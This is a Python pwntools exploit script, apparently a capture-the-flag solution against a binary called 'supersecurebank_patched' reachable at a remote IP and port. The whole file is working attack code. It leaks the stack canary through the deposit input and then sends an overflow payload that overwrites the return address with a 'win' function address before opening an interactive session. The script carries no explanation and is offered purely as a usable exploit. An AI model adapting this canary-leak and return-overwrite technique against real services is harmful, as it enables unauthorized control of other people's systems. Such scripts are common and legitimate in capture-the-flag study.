#!/usr/bin/env python3

from pwn import *

exe = ELF("./supersecurebank_patched")

context.binary = exe
context.terminal = ('tmux', 'split', '-h')

def conn():
    if args.GDB:
        r = gdb.debug([exe.path], '''
            b *deposit+207
            c
        ''')
    else:
        r = remote("10.45.1.2", 54323)

    return r

win = 0x40077D

def main():
    r = conn()

    r.sendlineafter(b': ', b'1')
    r.sendlineafter(b': ', b'14')

    r.sendlineafter(b': ', b'1' * 8)
    r.recvline()
    canary = r.recvuntil(b': ')[:7]
    canary = b'\0' + canary
    assert len(canary) == 8
    print(canary[::-1].hex())
    r.send((b'A' * 8 + canary + b'A' * 8 + p64(win)).rjust(48, b'A'))

    r.interactive()


if __name__ == "__main__":
    main()
